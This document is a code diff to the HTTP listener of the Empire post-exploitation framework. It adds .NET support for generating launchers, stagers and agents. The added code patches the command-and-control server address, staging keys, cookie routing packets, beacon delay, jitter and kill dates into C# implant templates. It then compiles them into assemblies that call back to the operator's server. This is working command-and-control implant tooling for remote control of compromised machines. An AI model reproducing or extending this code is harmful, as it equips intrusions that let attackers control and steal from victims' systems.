@@ -14,6 +14,7 @@ import json
 import sys
 from pydispatch import dispatcher
 from flask import Flask, request, make_response, send_from_directory
+import commands
 # Empire imports
 from lib.common import helpers
 from lib.common import agents
@@ -514,6 +515,27 @@ class Listener(object):
                 else:
                     return launcherBase
             
+            if language.startswith('do'):
+                f = open(self.mainMenu.installPath + "./data/agent/launchers/http.cs",'r')
+                code = f.read()
+                f.close()
+
+                if userAgent.lower() == 'default':
+                    profile = listenerOptions['DefaultProfile']['Value']
+                    userAgent = profile.split('|')[1]
+
+                routingPacket = packets.build_routing_packet(stagingKey, sessionID='00000000', language='DOTNET', meta='STAGE0', additional='None', encData='')
+                b64RoutingPacket = base64.b64encode(routingPacket)
+
+                code = code.replace('string u = "";', 'string u = "%s";' % userAgent)
+                code = code.replace('string k = "";', 'string k = "%s";' % stagingKey)
+                code = code.replace('string ser = Encoding.Unicode.GetString(Convert.FromBase64String(""));', 'string ser = Encoding.Unicode.GetString(Convert.FromBase64String("%s"));' % helpers.enc_powershell(host))
+                code = code.replace('wc.Headers.Add("Cookie", "");', 'wc.Headers.Add("Cookie", "%s=%s");' % (cookie, b64RoutingPacket))
+                f = open(self.mainMenu.installPath + "./data/dotnet/compiler/data/Tasks/CSharp/Launcher.task",'w')
+                f.write(code)
+                f.close()
+                code = helpers.get_dotnet_module_assembly_with_source(self.mainMenu.installPath,'Launcher','Launcher.task','3.5','1')
+                return code
             else:
                 print(helpers.color(
                     "[!] listeners/http generate_launcher(): invalid language specification: only 'powershell' and 'python' are currently supported for this module."))
@@ -642,6 +664,47 @@ class Listener(object):
                 # otherwise return the standard stager
                 return stager
         
+        elif language.lower() == 'dotnet':
+            # read in the stager base
+            f = open("%s/data/agent/stagers/http.cs" % (self.mainMenu.installPath))
+            stager = f.read()
+            f.close()
+
+            # make sure the server ends with "/"
+            if not host.endswith("/"):
+                host += "/"
+
+            #Patch in custom Headers
+            remove = []
+            if customHeaders != []:
+                for key in customHeaders:
+                    value = key.split(":")
+                    if 'cookie' in value[0].lower() and value[1]:
+                        continue
+                    remove += value
+                headers = ','.join(remove)
+                #headers = ','.join(customHeaders)
+                stager = stager.replace("string customHeaders = \"\";","string customHeaders = \""+headers+"\";")
+
+            #patch in working hours, if any
+            if workingHours != "":
+                stager = stager.replace('WORKING_HOURS_REPLACE', workingHours)
+
+            #Patch in the killdate, if any
+            if killDate != "":
+                stager = stager.replace('REPLACE_KILLDATE', killDate)
+
+            # patch the server and key information
+            stager = stager.replace('REPLACE_SERVER', host)
+            stager = stager.replace('REPLACE_STAGING_KEY', stagingKey)
+            stager = stager.replace('index.jsp', stage1)
+            stager = stager.replace('index.php', stage2)
+
+            f = open(self.mainMenu.installPath + "./data/dotnet/compiler/data/Tasks/CSharp/Stager.task",'w')
+            f.write(stager)
+            f.close()
+            stager = helpers.get_dotnet_module_assembly_with_source(self.mainMenu.installPath,'Stager','Stager.task','3.5','2')
+            return base64.b64encode(stager)
         else:
             print(helpers.color(
                 "[!] listeners/http generate_stager(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."))
@@ -722,6 +785,21 @@ class Listener(object):
                 code = code.replace('workingHours = ""', 'workingHours = "%s"' % (killDate))
             
             return code
+            
+        elif language == 'dotnet':
+            f = open(self.mainMenu.installPath + "./data/agent/agent.cs",'r')
+            code = f.read()
+            f.close()
+            code = code.replace('$AgentDelay = 60', "$AgentDelay = " + str(delay))
+            code = code.replace('$AgentJitter = 0', "$AgentJitter = " + str(jitter))
+            code = code.replace('$Profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"', "$Profile = \"" + str(profile) + "\"")
+            code = code.replace('$LostLimit = 60', "$LostLimit = " + str(lostLimit))
+            code = code.replace('$DefaultResponse = ""', '$DefaultResponse = "'+str(b64DefaultResponse)+'"')
+            f = open(self.mainMenu.installPath + "./data/dotnet/compiler/data/Tasks/CSharp/Agent.task",'w')
+            f.write(code)
+            f.close()
+            code = helpers.get_dotnet_module_assembly_with_source(self.mainMenu.installPath,'Agent','Agent.task','3.5','2')
+            return base64.b64encode(code)
         else:
             print(helpers.color(
                 "[!] listeners/http generate_agent(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."))
